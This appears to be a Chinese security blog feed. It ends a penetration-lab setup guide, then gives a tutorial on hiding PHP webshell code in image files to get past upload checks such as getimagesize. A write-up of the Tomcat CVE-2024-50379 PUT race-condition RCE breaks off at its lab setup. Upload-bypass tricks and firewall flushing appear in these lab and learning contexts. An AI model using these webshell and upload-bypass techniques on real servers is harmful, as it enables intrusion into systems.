src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.33.19.png" alt="截屏2024-12-30 16.33.19" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.39.09.png" alt="截屏2024-12-30 16.39.09" style="zoom:50%;"><p>显示无internet访问权限，并且有个多重网络的提示。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2016.47.37.png" style="zoom:50%;"><p>回过头去尝试用web2访问互联网，发现web2又不能访问互联网了，十分奇怪。</p><ul><li>vmnet8 开启DHCP服务</li></ul><p>猜测会不会是之前配置vmnet8时将DHCP服务关闭的原因</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2009.47.53.png" style="zoom:50%;"><p>所以将 answer VNET_8_DHCP no 改成yes。</p><p>然后执行下面的命令同步配置：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /Applications/VMware<span class="token punctuation">\</span> Fusion.app/Contents/Library/vmnet-cli <span class="token parameter variable">--configure</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>vmnet-cli 将根据上述修改的地址段自动修改 dhcpd.conf 和 nat.conf 中的 IP 地址。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.06.27.png" style="zoom:50%;"><p>查看 dhcpd.conf 和 nat.conf 配置文件：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /Library/Preferences/VMware<span class="token punctuation">\</span> Fusion/vmnet8/dhcpd.conf<span class="token function">cat</span> /Library/Preferences/VMware<span class="token punctuation">\</span> Fusion/vmnet8/nat.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>启动vmware fusion网络服务，执行命令：</p><pre class="line-numbers language-none"><code class="language-none">sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli --start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>保险起见重启VMware进行测试。</p><p><strong>web2测试</strong></p><p>web2可以访问互联网了。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.12.49.png" alt="截屏2024-12-30 17.12.49" style="zoom:50%;"><p><strong>PC1测试</strong></p><p>PC1和web2可以互相访问。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.16.22.png" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.17.16.png" style="zoom:50%;"><p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.18.11.png" alt="截屏2024-12-30 17.18.11"></p><p>PC1也可以访问互联网了！✅。</p><p>重新开启dhcp的配置还是可以的。</p><ul><li>重新给web1配置网卡的时候，PC1和web2又无法连接互联网了</li></ul><p>遂执行sudo /Applications/VMware\ Fusion.app/Contents/Library/vmnet-cli –start，后重启VMware。</p><p>问题得到解决。</p><p>至此，靶场环境搭建完毕。</p><p>回顾一下整个靶场的架构：</p><h2 id="2-6-靶场架构回顾"><a href="#2-6-靶场架构回顾" class="headerlink" title="2.6 靶场架构回顾"></a>2.6 靶场架构回顾</h2><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-30%2017.37.46.png" alt="靶场拓扑回顾" style="zoom:80%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.05.54.png" style="zoom:50%;"><h1 id="三、服务部署"><a href="#三、服务部署" class="headerlink" title="三、服务部署"></a>三、服务部署</h1><h2 id="3-1-DMZ区的-Ubuntu-启动nginx服务和redis服务"><a href="#3-1-DMZ区的-Ubuntu-启动nginx服务和redis服务" class="headerlink" title="3.1 DMZ区的 Ubuntu 启动nginx服务和redis服务"></a>3.1 DMZ区的 Ubuntu 启动nginx服务和redis服务</h2><ul><li>sudo redis-server /etc/redis.conf 【注意：以root权限启动】</li><li>/usr/sbin/nginx -c /etc/nginx/nginx.conf 【nginx已经启动】</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.24.23.png" style="zoom:50%;"><p>端口被占用。</p><p>reboot之后重新查看端口，依然被占用。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.27.53.png" style="zoom:50%;"><p>查看accesss.log，cat /var/log/nginx/access.log</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.37.54.png" style="zoom:50%;"><p>tail -f /var/log/nginx/access.log 追踪日志</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.40.38.png" style="zoom:50%;"><p>排查占用端口的进程：</p><p>普通权限执行时看不到pid</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.43.17.png" style="zoom:50%;"><p>sudo执行时可以看到pid</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.44.15.png" style="zoom:50%;"><p>杀死PID=826的进程。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.45.21.png" style="zoom:50%;"><p>然后尝试启动nginx。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.46.57.png" style="zoom:50%;"><p>还是502错误。</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.47.42.png" style="zoom:50%;"><p>遇到 Nginx 502 Bad Gateway 错误通常表示 Nginx 作为代理服务器在尝试从上游服务器获取响应时未能成功。</p><p>追踪报错 tail -f /var/log/nginx/error.log</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.52.27.png" style="zoom:50%;"><p><strong>上游服务器信息</strong>：<code>upstream: "https://47.101.57.72:443/"</code> 和 <code>upstream: "https://47.101.57.72:443/favicon.ico"</code> 表示 Nginx 尝试连接的上游服务器的地址和端口，但是连接失败，后端服务挂掉了。</p><p>这些错误日志表明 Nginx 作为反向代理服务器，尝试将请求转发到上游服务器（在这个例子中是 IP 地址为 <code>47.101.57.72</code> 的服务器）时，连接被拒绝。</p><p>目前可以不用理会，靶场渗透过程中也用不到这个80端口的站点。</p><p>访问81端口，可以成功访问到靶场web1的另一个站点：</p><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2011.01.03.png" style="zoom:50%;"><p>对于渗透来说足够了。</p><ul><li><p>iptables -F</p><blockquote><p><code>iptables -F</code> 是一个在 Linux 系统中使用的命令，它用于清空（Flush）<code>iptables</code> 的所有规则。<code>iptables</code> 是 Linux 内核中的一个包过滤框架，用于配置网络流量的防火墙规则。</p><p>具体来说，<code>iptables -F</code> 命令会执行以下操作：</p><ol><li><strong>清空所有链（Chains）</strong>：默认情况下，<code>iptables -F</code> 会清空默认的三个表（filter、nat、mangle）中的所有链（INPUT、FORWARD、OUTPUT、PREROUTING、POSTROUTING等）。</li><li><strong>不删除用户定义的链</strong>：如果你创建了自定义的链，它们不会被 <code>iptables -F</code> 命令删除。</li><li><strong>保留默认策略</strong>：<code>iptables -F</code> 不会改变链的默认策略（默认策略是指当一个包没有匹配任何规则时，iptables 将如何处理这个包）。例如，如果默认策略是 <code>ACCEPT</code>，即使清空了所有规则，这个默认策略仍然会保留。</li><li><strong>立即生效</strong>：<code>iptables -F</code> 命令会立即生效，不需要重启网络服务。</li></ol></blockquote><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.23.37.png" style="zoom:50%;"></li></ul><h2 id="3-2-二层网络的-web2启动docker容器"><a href="#3-2-二层网络的-web2启动docker容器" class="headerlink" title="3.2 二层网络的 web2启动docker容器"></a>3.2 二层网络的 web2启动docker容器</h2><ul><li>sudo service docker start</li><li>sudo docker start 8e172820ac78</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.13.32.png" style="zoom:50%;"><h2 id="3-3-第二层网络的-PC1-启动通达OA"><a href="#3-3-第二层网络的-PC1-启动通达OA" class="headerlink" title="3.3 第二层网络的 PC1 启动通达OA"></a>3.3 第二层网络的 PC1 启动通达OA</h2><ul><li>C:\MYOA\bin\AutoConfig.exe</li></ul><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.18.14.png" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.18.45.png" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.19.11.png" style="zoom:70%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.20.13.png" style="zoom:50%;"><img src="/2024/12/30/zong-he-shen-tou/san-ceng-wang-luo-yu-shen-tou-ba-chang-shi-zhan/%E6%88%AA%E5%B1%8F2024-12-31%2010.20.42.png" style="zoom:50%;"><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>至此靶场部署完毕，目标IP为192.168.43.253，可以开始渗透之旅了。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul><li><a href="https://blog.csdn.net/swadian2008/article/details/109518783">https://blog.csdn.net/swadian2008/article/details/109518783</a></li><li><a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/9/">http://vulnstack.qiyuanxuetang.net/vuln/detail/9/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 综合渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网攻防 </tag>
            
            <tag> 隧道搭建 </tag>
            
            <tag> 综合渗透 </tag>
            
            <tag> 域渗透 </tag>
            
            <tag> WHOAMI靶场 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>图片木马制作</title>
      <link href="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/"/>
      <url>/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/</url>
      
        <content type="html"><![CDATA[<p>图片木马的制作（ win系统完成）。</p><h1 id="方法1：GIF89a"><a href="#方法1：GIF89a" class="headerlink" title="方法1：GIF89a"></a>方法1：GIF89a</h1><p>新建 info.gif</p><p>内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">GIF98a<span class="token operator">&lt;</span>?php phpinfo?<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h1 id="方法2-命令行方法——文件合并"><a href="#方法2-命令行方法——文件合并" class="headerlink" title="方法2:命令行方法——文件合并"></a>方法2:命令行方法——文件合并</h1><p>准备一个图片和一个php代码文件。</p><p>copy 图片.jpg/b+代码.php/a 图片_代码.jpg</p><p>效果：图片能看，但是其中包含恶意代码。可能破坏代码结构，导致代码不可运行。解决：换一种方法或换一个图片（不好搞）。</p><h1 id="方法3-属性-详细信息-版权等"><a href="#方法3-属性-详细信息-版权等" class="headerlink" title="方法3:属性-详细信息-版权等"></a>方法3:属性-详细信息-版权等</h1><p>将恶意代码写在 图片属性-详细信息-版权等位置</p><p>图片能看，但是其中包含恶意代码</p><h1 id="方法4-利用十六进制编辑器-文件幻术"><a href="#方法4-利用十六进制编辑器-文件幻术" class="headerlink" title="方法4:利用十六进制编辑器+文件幻术"></a>方法4:利用十六进制编辑器+文件幻术</h1><p>我们知道所有的jpg图片的文件头部都是相同的，png和gif图片也是一样。</p><p>文件幻数：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gif <span class="token number">47</span> <span class="token number">49</span> <span class="token number">46</span> <span class="token number">38</span> <span class="token number">39</span> <span class="token number">61</span> F1 00 2C 01 F7 00 00 <span class="token number">64</span> <span class="token number">32</span> <span class="token number">33</span>jpgFF D8 FF E0 00 <span class="token number">10</span> 4A <span class="token number">46</span> <span class="token number">49</span> <span class="token number">46</span> 00 01 01 01 01 2Cpng  <span class="token number">89</span> <span class="token number">50</span> 4E <span class="token number">47</span> 0D 0A 1A 0A 00 00 00 0D <span class="token number">49</span> <span class="token number">48</span> <span class="token number">44</span> <span class="token number">52</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>notepad++ 插件-十六进制转ASCII，然后在下面写上木马内容。可以绕过 getimagesize 对内容的检测。</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2021-07-03%20%E4%B8%8A%E5%8D%8811.22.04.png" style="zoom:75%;"><p>upload-labs 14关绕过：</p><img src="/2024/12/27/web-an-quan/tu-pian-mu-ma-zhi-zuo/%E6%88%AA%E5%B1%8F2021-07-03%20%E4%B8%8A%E5%8D%8811.24.35.png" style="zoom:75%;"><p>src=”../upload/6320210703112421.jpg”</p><p>上传成功。服务器根据检测的内容，判定的jpg图像，并进行重命名。</p>]]></content>
      
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> 图片木马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache-Tomcat条件竞争致远程代码执行漏洞(CVE-2024-50379)</title>
      <link href="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/"/>
      <url>/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/</url>
      
        <content type="html"><![CDATA[<h1 id="一、-CVE-2024-50379-漏洞概述"><a href="#一、-CVE-2024-50379-漏洞概述" class="headerlink" title="一、(CVE-2024-50379)漏洞概述"></a>一、(CVE-2024-50379)漏洞概述</h1><h2 id="1-1-简介"><a href="#1-1-简介" class="headerlink" title="1.1 简介"></a>1.1 简介</h2><p>Apache Tomcat条件竞争致远程代码执行漏洞（CVE-2024-50379）是一个严重的安全漏洞，它允许攻击者在特定条件下绕过Tomcat的大小写检查，上传恶意文件并执行远程代码，可能导致服务器被完全控制。</p><h2 id="1-2-原理概述"><a href="#1-2-原理概述" class="headerlink" title="1.2 原理概述"></a>1.2 原理概述</h2><p>该漏洞是由于Tomcat在验证文件路径时存在缺陷，如果<code>readonly</code>参数被设置为<code>false</code>（这是一个非标准配置），并且服务器允许通过PUT方法上传文件，那么攻击者就可以上传含有恶意JSP代码的文件。通过不断地发送请求，攻击者可以利用条件竞争，使得Tomcat解析并执行这些恶意文件，从而实现远程代码执行。</p><h2 id="1-3-影响范围"><a href="#1-3-影响范围" class="headerlink" title="1.3 影响范围"></a>1.3 影响范围</h2><ul><li>受影响的Apache Tomcat版本包括：<ul><li>11.0.0-M1 &lt;= Apache Tomcat &lt; 11.0.2</li><li>10.1.0-M1 &lt;= Apache Tomcat &lt; 10.1.34</li><li>9.0.0.M1 &lt;= Apache Tomcat &lt; 9.0.98</li></ul></li><li>该漏洞仅影响在Windows系统下启用PUT请求方法，并将<code>readonly</code>参数设置为非默认值<code>false</code>的情况。</li></ul><h2 id="1-4-回顾CVE-2017-12615"><a href="#1-4-回顾CVE-2017-12615" class="headerlink" title="1.4 回顾CVE-2017-12615"></a>1.4 回顾<strong>CVE-2017-12615</strong></h2><p>CVE-2024-50379和CVE-2017-12615存在很多相似之处。</p><p>CVE-2017-12615是一个影响Apache Tomcat服务器的远程代码执行漏洞。</p><ul><li><p>当Apache Tomcat运行在Windows操作系统上，并且启用了HTTP PUT请求方法时（例如，通过将<code>readonly</code>初始化参数的默认值设置为<code>false</code>），攻击者可以通过精心构造的攻击请求向服务器上传包含任意代码的JSP文件。这些JSP文件中的代码能够被服务器执行，导致远程代码执行。</p></li><li><p>受影响的Apache Tomcat版本包括7.0.0至7.0.81。</p></li><li><p>该漏洞产生的原因是因为配置不当（非默认配置），具体来说，是将配置文件<code>conf/web.xml</code>中的<code>readonly</code>设置为了<code>false</code>，导致可以使用PUT方法上传任意文件。尽管对JSP后缀有限制，但对于不同平台存在多种绕过方法。</p></li><li><p>攻击者可以通过发送HTTP PUT请求，并在请求中包含恶意JSP代码，来利用此漏洞。例如，通过在.jsp后加入<code>/</code>或者其他方式来绕过文件上传限制。</p></li></ul><p>比如存在如下的web.xml的配置，当请求的后缀为jsp或jspx的时候交由JSP servlet进行处理请求，此外交给default servlet进行处理请求。但是当PUT一个1.jsp/、1.jsp空格、1.jsp%00从而绕过JSP servlet的限制，让default servlet来处理请求。</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token comment">&lt;!-- The mapping for the default servlet --&gt;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span> <span class="token comment">&lt;!-- The mappings for the JSP servlet --&gt;</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>*.jsp<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span>     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>url-pattern</span><span class="token punctuation">&gt;</span></span>*.jspx<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>url-pattern</span><span class="token punctuation">&gt;</span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-mapping</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span>   <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">doPut</span><span class="token punctuation">(</span><span class="token class-name">HttpServletRequest</span> req<span class="token punctuation">,</span> <span class="token class-name">HttpServletResponse</span> resp<span class="token punctuation">)</span>       <span class="token keyword">throws</span> <span class="token class-name">ServletException</span><span class="token punctuation">,</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>       <span class="token keyword">if</span> <span class="token punctuation">(</span>readOnly<span class="token punctuation">)</span> <span class="token punctuation">{</span>           <span class="token function">sendNotAllowed</span><span class="token punctuation">(</span>req<span class="token punctuation">,</span> resp<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token keyword">return</span><span class="token punctuation">;</span>       <span class="token punctuation">}</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>从上面的代码中，当readOnly设置为true的时候（也就是关闭PUT方法）会直接返回；但是如果设置为了false，可以通过一些措施绕过后缀名的检测来上传webshell。</p><p>CVE-2024-50379也会利用到readOnly=false的条件，这时通过put上传1.Jsp的恶意代码（Jsp的J大写是为了绕过后缀名的检测）到服务器。</p><p>通过并发put文件上传非标准后缀的”jsp”，并不断发起get请求一个标准后最的”jsp”文件，最终由于服务器的大小写不敏感，导致请求成功造成RCE。</p><h1 id="二、漏洞复现"><a href="#二、漏洞复现" class="headerlink" title="二、漏洞复现"></a>二、漏洞复现</h1><h2 id="2-1-环境搭建"><a href="#2-1-环境搭建" class="headerlink" title="2.1 环境搭建"></a>2.1 环境搭建</h2><h3 id="2-1-1-环境条件"><a href="#2-1-1-环境条件" class="headerlink" title="2.1.1 环境条件"></a>2.1.1 环境条件</h3><ul><li>jre1.8.0_202 【可以联系笔者私发】</li><li>apache-tomcat-9.0.63 【<a href="https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.63/%E3%80%91">https://archive.apache.org/dist/tomcat/tomcat-9/v9.0.63/】</a></li><li>win7 虚拟机</li></ul><h3 id="2-1-2-windows虚拟机配置环境变量"><a href="#2-1-2-windows虚拟机配置环境变量" class="headerlink" title="2.1.2 windows虚拟机配置环境变量"></a>2.1.2 windows虚拟机配置环境变量</h3><p>配置JAVA_HOME：</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2015.40.14.png" style="zoom:80%;"><p>在Path中将这个版本的java的环境变量置顶，防止其他版本的干扰：</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.16.04.png" style="zoom:70%;"><p>配置CATALINA_BASE：</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2015.43.43.png" style="zoom:70%;"><blockquote><p><code>CATALINA_BASE</code>环境变量在Apache Tomcat中扮演着重要的角色，其主要作用和配置如下：</p><ol><li><strong>定义和作用</strong>：<ul><li><code>CATALINA_BASE</code>环境变量定义了Tomcat的工作目录，这个目录是Tomcat部署应用程序的基础路径。它通常用于隔离不同应用程序的配置和资源，允许多个Tomcat实例共享同一个<code>CATALINA_HOME</code>，但拥有独立的工作目录。这对于多租户环境非常有用，因为它可以防止应用程序之间的资源冲突。</li></ul></li><li><strong>与CATALINA_HOME的区别</strong>：<ul><li><code>CATALINA_HOME</code>是Tomcat的安装目录，包含了Tomcat的所有核心文件和目录。而<code>CATALINA_BASE</code>是指Tomcat的基本目录，包括配置文件、日志文件和Web应用程序等。如果只运行一个Tomcat实例，这两个属性指向的位置是相同的。</li></ul></li><li><strong>配置多个实例</strong>：<ul><li>当需要在一台计算机上运行多个Tomcat实例时，可以通过设置不同的<code>CATALINA_BASE</code>来实现。每个实例可以有自己的配置文件、日志文件、临时文件、Web应用程序和工作目录，而共享<code>CATALINA_HOME</code>中的公共文件如<code>bin</code>和<code>lib</code>目录。</li></ul></li></ol></blockquote><h3 id="2-1-3-启动tomcat"><a href="#2-1-3-启动tomcat" class="headerlink" title="2.1.3 启动tomcat"></a>2.1.3 启动tomcat</h3><p>这下环境变量就已经配置齐了 这个时候就已经可以正常启动tomcat了 运行这个批处理文件。</p><p>C:\Users\client\Desktop\apache-tomcat-9.0.63\apache-tomcat-9.0.63\bin\startup.bat</p><p>启动成功（乱码）</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.17.33.png" style="zoom:50%;"><p>找到<strong>Tomcat</strong>目录下<strong>conf</strong>文件夹中的<strong>logging.properties</strong>文件，</p><p>打开<strong>logging.properties</strong>文件，找到文件中的<strong>java.util.logging.ConsoleHandler.encoding = UTF-8，</strong></p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.20.32.png" style="zoom:80%;"><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.21.52.png" style="zoom:80%;"><p>将其中的<strong>UTF-8</strong>改为<strong>GBK</strong>，保存后<a href="https://so.csdn.net/so/search?q=%E9%87%8D%E5%90%AFTomcat&amp;spm=1001.2101.3001.7020">重启Tomcat</a>服务，启动后就会看到刚才的乱码已经转换过来了。</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.22.44.png" style="zoom:60%;"><p>访问测试：</p><img src="/2024/12/26/lou-dong-zhi-shi-ku/apache-tomcat-tiao-jian-jing-zheng-zhi-yuan-cheng-dai-ma-zhi-xing-lou-dong-cve-2024-50379/%E6%88%AA%E5%B1%8F2024-12-26%2016.24.46.png" style="zoom:50%;"><h2 id="2-2-漏洞复现"><a href="#2-2-漏洞复现" class="headerlink" title="2.2 漏洞复现"></a>2.2 漏洞复现</h2><p>web.xml readOnly配置为false，即允许PUT上传：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-name</span><span class="token punctuation">&gt;</span></span>default<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-name</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>servlet-class</span><span class="token punctuation">&gt;</span></span>org.apache.catalina.servlets.DefaultServlet<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>servlet-class</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>debug<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>0<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">&gt;</span></span>listings<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">&gt;</span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token 